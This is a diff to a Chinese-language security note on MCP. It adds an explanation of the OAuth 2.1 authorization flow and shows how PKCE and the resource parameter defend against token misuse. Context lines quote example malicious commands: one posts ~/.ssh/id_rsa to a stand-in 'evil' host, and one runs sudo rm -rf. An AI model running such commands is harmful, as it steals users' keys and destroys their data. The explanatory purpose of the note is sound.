@@ -3,6 +3,7 @@ date: 2026-07-02
 tags:
   - mcp
   - security
+  - oauth
 ---
 
 # MCP 的安全模型:誰該防誰
@@ -46,6 +47,48 @@ npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil
 # 提權
 sudo rm -rf /important/system/files && echo "MCP server installed!"
 ```
+
+## 遠端授權怎麼跑——OAuth 2.1,MCP server 只是「資源」不是「授權者」
+
+前面幾節提到的 Confused Deputy、Token Passthrough,都是**同一套 OAuth 授權流程沒做好**才長出來
+的問題——先把這套流程本身弄清楚,才看得懂那些漏洞到底漏在哪一步。
+
+關鍵的角色分工:**MCP server 是 OAuth 裡的「Resource Server」(被保護的資源),不是
+「Authorization Server」(發權杖的人)**——這兩件事故意分開,MCP server 自己不管使用者登入、
+不管同意畫面,那些都是外部的授權伺服器的事。整條路徑(官方規格畫的順序):
+
+```
+1. Client 沒帶 token 打 MCP request → Server 回 401 + WWW-Authenticate header
+2. Client 從 header 找到 Protected Resource Metadata 的網址,去問「你信任哪個授權伺服器」
+3. Client 再去問那個授權伺服器的 metadata(discovery)
+4. Client 決定怎麼取得 client_id——三選一:
+   用一個 HTTPS 網址當 client_id(讓 AS 自己去抓 metadata)/
+   動態註冊(RFC 7591)/ 用預先註冊好的 client_id
+5. Client 生成 PKCE 參數 + 帶上 resource 參數,把使用者導去授權頁面
+6. 使用者在授權伺服器上按同意 → 導回一個 authorization code
+7. Client 拿 code + code_verifier + resource 去換 access token
+8. Client 帶著 token 打 MCP server,這次通過
+```
+— [`basic/authorization.mdx` § Authorization Flow](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/docs/specification/2025-11-25/basic/authorization.mdx)
+
+底層是這五份標準疊起來的:OAuth 2.1(核心框架)、RFC 8414(授權伺服器 metadata discovery)、
+RFC 7591(動態 client 註冊)、RFC 9728(受保護資源 metadata)、RFC 8707(resource indicator)
+(見 [`docs/tutorials/security/authorization.mdx`](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/docs/docs/tutorials/security/authorization.mdx))。
+
+**兩個步驟是專門為了擋掉前面幾節提到的攻擊,不是隨便加的:**
+
+- **PKCE 是必須的**,連本來被信任的 confidential client 也不能跳過:「By using a secret
+  verifier-challenge pair, PKCE ensures that only the original requestor can exchange an
+  authorization code for tokens」(見同一份 `authorization.mdx`)——防的正是 authorization
+  code 在轉導過程中被攔截、被別人拿去換 token。
+- **`resource` 參數(RFC 8707)是防 Token Passthrough 的關鍵**:授權請求跟換 token 請求都
+  **必須**帶上「這個 token 是要給哪個 MCP server 用的」這個參數,值是那台 server 的
+  canonical URI。官方原文:「access tokens are cryptographically bound to their intended
+  resources, preventing them from being misused across different services」——這正是前面
+  Token Passthrough 那節提到的漏洞,在協定層面被堵起來的方式:token 一開始就綁死了「只能用在
+  這一台 server」,拿去別的地方用不了。**注意這防的是 Token Passthrough,不是 Confused
+  Deputy**——Confused Deputy 的病根是「proxy 對不同 client 共用同一份同意狀態」,resource
+  參數管不到這件事,得靠下面那節講的逐個 client 檢查同意。
 
 ## Confused Deputy Problem——你信任的中間人被騙去做壞事
 
@@ -132,9 +175,11 @@ untrusted content」的其中一種樣子——只是這次不信任的內容不
   ——這篇筆記大部分內容的主要來源:Confused Deputy 的觸發條件、Token Passthrough、兩種
   Session Hijacking、本機 server 淪陷的風險與惡意指令範例。
 - [`specification/2025-11-25/basic/authorization.mdx`](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/docs/specification/2025-11-25/basic/authorization.mdx)
-  ——Confused Deputy Problem 在正式規格裡的定義段落。
+  ——Confused Deputy Problem 的正式定義、完整 OAuth 2.1 授權流程的 sequence diagram、PKCE
+  跟 resource 參數(RFC 8707)的官方原句。
 - [`docs/tutorials/security/authorization.mdx`](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/docs/docs/tutorials/security/authorization.mdx)
-  ——錯誤訊息不外洩細節、內部用 correlation ID 記錄的做法。
+  ——錯誤訊息不外洩細節、內部用 correlation ID 記錄的做法、五份底層標準(OAuth 2.1 + RFC
+  8414/7591/9728/8707)的清單。
 - [`blog/2026-03-16-tool-annotations.md`](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/blog/content/posts/2026-03-16-tool-annotations.md)
   ——Lethal Trifecta 的官方引用(概念本身出處是 Simon Willison,MCP 官方部落格拿來論證 tool
   annotation SEP 的動機)、真實示範案例(日曆事件 + MCP calendar server + 本機執行工具)。
